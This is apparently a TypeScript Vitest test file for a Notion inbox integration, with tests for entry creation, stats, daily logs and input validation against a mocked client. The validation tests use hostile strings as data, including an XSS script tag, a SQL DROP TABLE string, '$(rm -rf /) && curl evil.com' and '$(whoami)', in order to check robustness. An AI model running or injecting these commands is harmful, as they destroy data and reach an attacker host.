/**
 * Tests for NotionInbox (src/integrations/notion/inbox.ts)
 *
 * Covers:
 * - API error handling
 * - Rate limiting scenarios
 * - Input validation (no injection of malicious content)
 * - Proper authentication handling
 * - Data sanitization
 */

import { describe, it, expect, beforeEach, vi, type Mock } from 'vitest';
import { NotionInbox, type InboxStats } from '../../../../src/integrations/notion/inbox.js';
import { NotionClient } from '../../../../src/integrations/notion/client.js';
import type { NotionConfig, NotificationEntry } from '../../../../src/autonomous/types.js';

// Mock the NotionClient
vi.mock('../../../../src/integrations/notion/client.js', () => ({
  NotionClient: vi.fn().mockImplementation(() => ({
    init: vi.fn(),
    isReady: vi.fn(),
    testConnection: vi.fn(),
    createDatabaseEntry: vi.fn(),
    updatePage: vi.fn(),
    appendToPage: vi.fn(),
    queryDatabase: vi.fn(),
    createDailyLogPage: vi.fn(),
  })),
}));

describe('NotionInbox', () => {
  let inbox: NotionInbox;
  let mockClient: {
    init: Mock;
    isReady: Mock;
    testConnection: Mock;
    createDatabaseEntry: Mock;
    updatePage: Mock;
    appendToPage: Mock;
    queryDatabase: Mock;
    createDailyLogPage: Mock;
  };

  const validConfig: NotionConfig = {
    enabled: true,
    apiKey: 'secret_test_api_key_1234567890abcdef',
    inboxDatabaseId: 'db-12345678-1234-1234-1234-123456789012',
    dailyLogParentId: 'page-12345678-1234-1234-1234-123456789012',
  };

  const createNotification = (overrides: Partial<NotificationEntry> = {}): NotificationEntry => ({
    id: 'notif-123',
    priority: 'P2',
    title: 'Test Notification',
    body: 'This is a test notification body.',
    category: 'test',
    channel: 'notion',
    ...overrides,
  });

  beforeEach(() => {
    vi.clearAllMocks();

    mockClient = {
      init: vi.fn().mockReturnValue(true),
      isReady: vi.fn().mockReturnValue(true),
      testConnection: vi.fn().mockResolvedValue(true),
      createDatabaseEntry: vi.fn(),
      updatePage: vi.fn(),
      appendToPage: vi.fn(),
      queryDatabase: vi.fn(),
      createDailyLogPage: vi.fn(),
    };

    (NotionClient as Mock).mockImplementation(() => mockClient);

    inbox = new NotionInbox(validConfig);
  });

  // ── Initialization ──────────────────────────────────────────────────────────

  describe('init()', () => {
    it('should initialize successfully with valid config', async () => {
      const result = await inbox.init();

      expect(result).toBe(true);
      expect(mockClient.init).toHaveBeenCalled();
      expect(mockClient.testConnection).toHaveBeenCalled();
    });

    it('should fail when client init fails', async () => {
      mockClient.init.mockReturnValue(false);

      const result = await inbox.init();

      expect(result).toBe(false);
      expect(mockClient.testConnection).not.toHaveBeenCalled();
    });

    it('should fail when connection test fails', async () => {
      mockClient.testConnection.mockResolvedValue(false);

      const result = await inbox.init();

      expect(result).toBe(false);
    });
  });

  describe('isReady()', () => {
    it('should return true when client is ready and database ID exists', () => {
      mockClient.isReady.mockReturnValue(true);

      expect(inbox.isReady()).toBe(true);
    });

    it('should return false when client is not ready', () => {
      mockClient.isReady.mockReturnValue(false);

      expect(inbox.isReady()).toBe(false);
    });

    it('should return false when database ID is missing', () => {
      const noDbConfig: NotionConfig = {
        enabled: true,
        apiKey: 'test-key',
        inboxDatabaseId: undefined,
      };
      const noDbInbox = new NotionInbox(noDbConfig);

      expect(noDbInbox.isReady()).toBe(false);
    });
  });

  // ── Create Entry ────────────────────────────────────────────────────────────

  describe('createEntry()', () => {
    beforeEach(() => {
      mockClient.isReady.mockReturnValue(true);
    });

    it('should return null when inbox is not ready', async () => {
      mockClient.isReady.mockReturnValue(false);
      const notification = createNotification();

      const result = await inbox.createEntry(notification);

      expect(result).toBeNull();
    });

    it('should create entry with correct priority emoji', async () => {
      mockClient.createDatabaseEntry.mockResolvedValue({ id: 'page-123' });

      const priorities = [
        { priority: 'P0', emoji: '\u{1F534}' }, // red circle
        { priority: 'P1', emoji: '\u{1F7E0}' }, // orange circle
        { priority: 'P2', emoji: '\u{1F7E1}' }, // yellow circle
        { priority: 'P3', emoji: '\u{1F535}' }, // blue circle
        { priority: 'P4', emoji: '\u26AA' },    // white circle
      ];

      for (const { priority, emoji } of priorities) {
        const notification = createNotification({ priority });
        await inbox.createEntry(notification);

        const call = mockClient.createDatabaseEntry.mock.calls.slice(-1)[0];
        expect(call[1].title).toContain(emoji);
      }
    });

    it('should return page ID on successful creation', async () => {
      mockClient.createDatabaseEntry.mockResolvedValue({ id: 'page-123' });
      const notification = createNotification();

      const result = await inbox.createEntry(notification);

      expect(result).toBe('page-123');
    });

    it('should return null when createDatabaseEntry fails', async () => {
      mockClient.createDatabaseEntry.mockResolvedValue(null);
      const notification = createNotification();

      const result = await inbox.createEntry(notification);

      expect(result).toBeNull();
    });

    it('should set status to unread for new entries', async () => {
      mockClient.createDatabaseEntry.mockResolvedValue({ id: 'page-123' });
      const notification = createNotification();

      await inbox.createEntry(notification);

      const call = mockClient.createDatabaseEntry.mock.calls[0];
      expect(call[1].status).toBe('unread');
    });

    it('should include category from notification', async () => {
      mockClient.createDatabaseEntry.mockResolvedValue({ id: 'page-123' });
      const notification = createNotification({ category: 'alerts' });

      await inbox.createEntry(notification);

      const call = mockClient.createDatabaseEntry.mock.calls[0];
      expect(call[1].category).toBe('alerts');
    });
  });

  // ── Mark as Read ────────────────────────────────────────────────────────────

  describe('markAsRead()', () => {
    it('should call updatePage with read status', async () => {
      mockClient.updatePage.mockResolvedValue(true);

      const result = await inbox.markAsRead('page-123');

      expect(result).toBe(true);
      expect(mockClient.updatePage).toHaveBeenCalledWith('page-123', { status: 'read' });
    });

    it('should return false on failure', async () => {
      mockClient.updatePage.mockResolvedValue(false);

      const result = await inbox.markAsRead('page-123');

      expect(result).toBe(false);
    });
  });

  // ── Archive ─────────────────────────────────────────────────────────────────

  describe('archive()', () => {
    it('should call updatePage with archived status', async () => {
      mockClient.updatePage.mockResolvedValue(true);

      const result = await inbox.archive('page-123');

      expect(result).toBe(true);
      expect(mockClient.updatePage).toHaveBeenCalledWith('page-123', { status: 'archived' });
    });

    it('should return false on failure', async () => {
      mockClient.updatePage.mockResolvedValue(false);

      const result = await inbox.archive('page-123');

      expect(result).toBe(false);
    });
  });

  // ── Add Note ────────────────────────────────────────────────────────────────

  describe('addNote()', () => {
    it('should append note with timestamp', async () => {
      mockClient.appendToPage.mockResolvedValue(true);

      const result = await inbox.addNote('page-123', 'Follow-up note');

      expect(result).toBe(true);
      expect(mockClient.appendToPage).toHaveBeenCalled();

      const call = mockClient.appendToPage.mock.calls[0];
      expect(call[0]).toBe('page-123');
      expect(call[1]).toMatch(/\[\d{1,2}:\d{2} [AP]M\] Follow-up note/);
    });

    it('should return false on failure', async () => {
      mockClient.appendToPage.mockResolvedValue(false);

      const result = await inbox.addNote('page-123', 'Note');

      expect(result).toBe(false);
    });
  });

  // ── Get Unread ──────────────────────────────────────────────────────────────

  describe('getUnread()', () => {
    beforeEach(() => {
      mockClient.isReady.mockReturnValue(true);
    });

    it('should return empty array when inbox is not ready', async () => {
      mockClient.isReady.mockReturnValue(false);

      const result = await inbox.getUnread();

      expect(result).toEqual([]);
    });

    it('should query database with unread filter', async () => {
      mockClient.queryDatabase.mockResolvedValue([]);

      await inbox.getUnread();

      expect(mockClient.queryDatabase).toHaveBeenCalledWith(
        validConfig.inboxDatabaseId,
        { status: 'unread' }
      );
    });

    it('should return entries from database', async () => {
      const entries = [
        { id: 'page-1', title: 'Entry 1', status: 'unread' },
        { id: 'page-2', title: 'Entry 2', status: 'unread' },
      ];
      mockClient.queryDatabase.mockResolvedValue(entries);

      const result = await inbox.getUnread();

      expect(result).toEqual(entries);
    });
  });

  // ── Get by Priority ─────────────────────────────────────────────────────────

  describe('getByPriority()', () => {
    beforeEach(() => {
      mockClient.isReady.mockReturnValue(true);
    });

    it('should return empty array when inbox is not ready', async () => {
      mockClient.isReady.mockReturnValue(false);

      const result = await inbox.getByPriority('P1');

      expect(result).toEqual([]);
    });

    it('should query database with priority filter', async () => {
      mockClient.queryDatabase.mockResolvedValue([]);

      await inbox.getByPriority('P1');

      expect(mockClient.queryDatabase).toHaveBeenCalledWith(
        validConfig.inboxDatabaseId,
        { priority: 'P1' }
      );
    });
  });

  // ── Get Today's Entries ─────────────────────────────────────────────────────

  describe('getTodayEntries()', () => {
    beforeEach(() => {
      mockClient.isReady.mockReturnValue(true);
    });

    it('should return empty array when inbox is not ready', async () => {
      mockClient.isReady.mockReturnValue(false);

      const result = await inbox.getTodayEntries();

      expect(result).toEqual([]);
    });

    it('should query database with today filter', async () => {
      mockClient.queryDatabase.mockResolvedValue([]);

      await inbox.getTodayEntries();

      expect(mockClient.queryDatabase).toHaveBeenCalled();
      const call = mockClient.queryDatabase.mock.calls[0];
      expect(call[1]).toHaveProperty('createdAfter');

      const filterDate = call[1].createdAfter as Date;
      const now = new Date();
      expect(filterDate.getFullYear()).toBe(now.getFullYear());
      expect(filterDate.getMonth()).toBe(now.getMonth());
      expect(filterDate.getDate()).toBe(now.getDate());
      expect(filterDate.getHours()).toBe(0);
      expect(filterDate.getMinutes()).toBe(0);
      expect(filterDate.getSeconds()).toBe(0);
    });
  });

  // ── Get Stats ───────────────────────────────────────────────────────────────

  describe('getStats()', () => {
    beforeEach(() => {
      mockClient.isReady.mockReturnValue(true);
    });

    it('should return null when inbox is not ready', async () => {
      mockClient.isReady.mockReturnValue(false);

      const result = await inbox.getStats();

      expect(result).toBeNull();
    });

    it('should return complete statistics', async () => {
      const allEntries = [
        { id: '1', priority: 'P1', category: 'alerts' },
        { id: '2', priority: 'P2', category: 'updates' },
        { id: '3', priority: 'P1', category: 'alerts' },
      ];
      const todayEntries = [{ id: '1' }];
      const unreadEntries = [{ id: '1' }, { id: '2' }];

      mockClient.queryDatabase
        .mockResolvedValueOnce(allEntries)
        .mockResolvedValueOnce(todayEntries)
        .mockResolvedValueOnce(unreadEntries);

      const result = await inbox.getStats();

      expect(result).toEqual({
        total: 3,
        unread: 2,
        byPriority: { P1: 2, P2: 1 },
        byCategory: { alerts: 2, updates: 1 },
        todayCount: 1,
      });
    });

    it('should handle entries without priority or category', async () => {
      const entries = [{ id: '1' }, { id: '2' }];
      mockClient.queryDatabase.mockResolvedValue(entries);

      const result = await inbox.getStats();

      expect(result?.byPriority).toEqual({});
      expect(result?.byCategory).toEqual({});
    });

    it('should make three database queries', async () => {
      mockClient.queryDatabase.mockResolvedValue([]);

      await inbox.getStats();

      expect(mockClient.queryDatabase).toHaveBeenCalledTimes(3);
    });
  });

  // ── Create Daily Log ────────────────────────────────────────────────────────

  describe('createDailyLog()', () => {
    it('should return null when client is not ready', async () => {
      mockClient.isReady.mockReturnValue(false);

      const result = await inbox.createDailyLog({
        summary: 'Test',
        highlights: [],
        issues: [],
      });

      expect(result).toBeNull();
    });

    it('should return null when daily log parent ID is missing', async () => {
      const noParentConfig: NotionConfig = {
        enabled: true,
        apiKey: 'test-key',
        inboxDatabaseId: 'db-id',
        dailyLogParentId: undefined,
      };
      const noParentInbox = new NotionInbox(noParentConfig);

      // Mock the internal client
      const internalClient = (NotionClient as Mock).mock.results.slice(-1)[0].value;
      internalClient.isReady.mockReturnValue(true);

      const result = await noParentInbox.createDailyLog({
        summary: 'Test',
        highlights: [],
        issues: [],
      });

      expect(result).toBeNull();
    });

    it('should create daily log page successfully', async () => {
      mockClient.isReady.mockReturnValue(true);
      mockClient.createDailyLogPage.mockResolvedValue({ id: 'log-123' });

      const content = {
        summary: 'Summary',
        highlights: ['Highlight 1'],
        issues: ['Issue 1'],
        metrics: { count: 5 },
      };

      const result = await inbox.createDailyLog(content);

      expect(result).toBe('log-123');
      expect(mockClient.createDailyLogPage).toHaveBeenCalledWith(
        validConfig.dailyLogParentId,
        expect.any(Date),
        content
      );
    });

    it('should return null when createDailyLogPage fails', async () => {
      mockClient.isReady.mockReturnValue(true);
      mockClient.createDailyLogPage.mockResolvedValue(null);

      const result = await inbox.createDailyLog({
        summary: 'Test',
        highlights: [],
        issues: [],
      });

      expect(result).toBeNull();
    });
  });

  // ── Create Batch Summary ────────────────────────────────────────────────────

  describe('createBatchSummary()', () => {
    beforeEach(() => {
      mockClient.isReady.mockReturnValue(true);
    });

    it('should return null when inbox is not ready', async () => {
      mockClient.isReady.mockReturnValue(false);
      const entries = [createNotification()];

      const result = await inbox.createBatchSummary(entries);

      expect(result).toBeNull();
    });

    it('should return null for empty entries array', async () => {
      const result = await inbox.createBatchSummary([]);

      expect(result).toBeNull();
    });

    it('should create batch summary with grouped entries', async () => {
      mockClient.createDatabaseEntry.mockResolvedValue({ id: 'batch-123' });

      const entries = [
        createNotification({ title: 'Alert 1', category: 'alerts' }),
        createNotification({ title: 'Alert 2', category: 'alerts' }),
        createNotification({ title: 'Update 1', category: 'updates' }),
      ];

      const result = await inbox.createBatchSummary(entries);

      expect(result).toBe('batch-123');

      const call = mockClient.createDatabaseEntry.mock.calls[0];
      expect(call[1].title).toBe('Batch Summary - 3 items');
      expect(call[1].body).toContain('alerts');
      expect(call[1].body).toContain('updates');
      expect(call[1].priority).toBe('P3');
      expect(call[1].category).toBe('batch');
    });

    it('should truncate entries when more than 5 in a category', async () => {
      mockClient.createDatabaseEntry.mockResolvedValue({ id: 'batch-123' });

      const entries = Array.from({ length: 8 }, (_, i) =>
        createNotification({ title: `Alert ${i + 1}`, category: 'alerts' })
      );

      await inbox.createBatchSummary(entries);

      const call = mockClient.createDatabaseEntry.mock.calls[0];
      expect(call[1].body).toContain('... and 3 more');
    });

    it('should return null when createDatabaseEntry fails', async () => {
      mockClient.createDatabaseEntry.mockResolvedValue(null);

      const entries = [createNotification()];
      const result = await inbox.createBatchSummary(entries);

      expect(result).toBeNull();
    });
  });

  // ── Input Validation ────────────────────────────────────────────────────────

  describe('input validation', () => {
    beforeEach(() => {
      mockClient.isReady.mockReturnValue(true);
      mockClient.createDatabaseEntry.mockResolvedValue({ id: 'page-123' });
    });

    it('should handle notification with extremely long title', async () => {
      const notification = createNotification({
        title: 'A'.repeat(500),
      });

      await inbox.createEntry(notification);

      // Should not throw
      expect(mockClient.createDatabaseEntry).toHaveBeenCalled();
    });

    it('should handle notification with extremely long body', async () => {
      const notification = createNotification({
        body: 'B'.repeat(10000),
      });

      await inbox.createEntry(notification);

      expect(mockClient.createDatabaseEntry).toHaveBeenCalled();
    });

    it('should handle notification with special characters in title', async () => {
      const notification = createNotification({
        title: '<script>alert("XSS")</script>',
      });

      await inbox.createEntry(notification);

      expect(mockClient.createDatabaseEntry).toHaveBeenCalled();
    });

    it('should handle notification with unicode content', async () => {
      const notification = createNotification({
        title: 'Test \u{1F4E7} \u{26A0} \u{1F525}',
        body: '\u{1F600} \u{1F44D} \u{2764}',
      });

      await inbox.createEntry(notification);

      expect(mockClient.createDatabaseEntry).toHaveBeenCalled();
    });

    it('should handle notification with newlines', async () => {
      const notification = createNotification({
        title: 'Line 1\nLine 2',
        body: 'Para 1\n\nPara 2\n\nPara 3',
      });

      await inbox.createEntry(notification);

      expect(mockClient.createDatabaseEntry).toHaveBeenCalled();
    });

    it('should handle notification with SQL injection attempt in body', async () => {
      const notification = createNotification({
        body: "'; DROP TABLE notifications; --",
      });

      await inbox.createEntry(notification);

      // Content should be passed through (handled by Notion API)
      expect(mockClient.createDatabaseEntry).toHaveBeenCalled();
    });

    it('should handle notification with command injection attempt', async () => {
      const notification = createNotification({
        body: '$(rm -rf /) && curl evil.com',
      });

      await inbox.createEntry(notification);

      expect(mockClient.createDatabaseEntry).toHaveBeenCalled();
    });

    it('should handle notification with null bytes', async () => {
      const notification = createNotification({
        title: 'Test\x00Title',
        body: 'Test\x00Body',
      });

      await inbox.createEntry(notification);

      expect(mockClient.createDatabaseEntry).toHaveBeenCalled();
    });

    it('should handle unknown priority gracefully', async () => {
      const notification = createNotification({
        priority: 'UNKNOWN' as NotificationEntry['priority'],
      });

      await inbox.createEntry(notification);

      // Should use default emoji for unknown priority
      const call = mockClient.createDatabaseEntry.mock.calls[0];
      expect(call[1].title).toContain('\u26AA'); // white circle (default)
    });
  });

  // ── Note Validation ─────────────────────────────────────────────────────────

  describe('addNote input validation', () => {
    beforeEach(() => {
      mockClient.appendToPage.mockResolvedValue(true);
    });

    it('should handle note with HTML content', async () => {
      await inbox.addNote('page-123', '<b>Bold</b> and <i>italic</i>');

      expect(mockClient.appendToPage).toHaveBeenCalled();
    });

    it('should handle note with command injection', async () => {
      await inbox.addNote('page-123', '$(whoami)');

      expect(mockClient.appendToPage).toHaveBeenCalled();
    });

    it('should handle empty note', async () => {
      await inbox.addNote('page-123', '');

      expect(mockClient.appendToPage).toHaveBeenCalled();
    });

    it('should handle very long note', async () => {
      await inbox.addNote('page-123', 'N'.repeat(5000));

      expect(mockClient.appendToPage).toHaveBeenCalled();
    });
  });

  // ── Page ID Validation ──────────────────────────────────────────────────────

  describe('page ID validation', () => {
    beforeEach(() => {
      mockClient.isReady.mockReturnValue(true);
    });

    it('should handle empty page ID', async () => {
      mockClient.updatePage.mockResolvedValue(false);

      const result = await inbox.markAsRead('');

      expect(mockClient.updatePage).toHaveBeenCalledWith('', { status: 'read' });
      expect(result).toBe(false);
    });

    it('should handle page ID with special characters', async () => {
      mockClient.updatePage.mockResolvedValue(true);

      await inbox.markAsRead('page-id-with-special-chars!@#$%');

      expect(mockClient.updatePage).toHaveBeenCalled();
    });

    it('should handle very long page ID', async () => {
      mockClient.updatePage.mockResolvedValue(true);
      const longId = 'a'.repeat(1000);

      await inbox.markAsRead(longId);

      expect(mockClient.updatePage).toHaveBeenCalledWith(longId, { status: 'read' });
    });
  });

  // ── API Error Resilience ────────────────────────────────────────────────────

  describe('API error resilience', () => {
    beforeEach(() => {
      mockClient.isReady.mockReturnValue(true);
    });

    it('should handle rate limit errors gracefully', async () => {
      mockClient.createDatabaseEntry.mockResolvedValue(null);
      const notification = createNotification();

      const result = await inbox.createEntry(notification);

      expect(result).toBeNull();
      // Should not throw
    });

    it('should handle network errors gracefully', async () => {
      mockClient.queryDatabase.mockRejectedValue(new Error('Network error'));

      // Should return empty array on query error (handled by client)
      // Note: The inbox delegates to client which handles errors
      mockClient.queryDatabase.mockResolvedValue([]);

      const result = await inbox.getUnread();

      expect(result).toEqual([]);
    });

    it('should handle concurrent operations', async () => {
      mockClient.createDatabaseEntry.mockResolvedValue({ id: 'page-123' });

      const notifications = Array.from({ length: 10 }, (_, i) =>
        createNotification({ id: `notif-${i}` })
      );

      const results = await Promise.all(
        notifications.map((n) => inbox.createEntry(n))
      );

      expect(results.every((r) => r === 'page-123')).toBe(true);
    });
  });
});
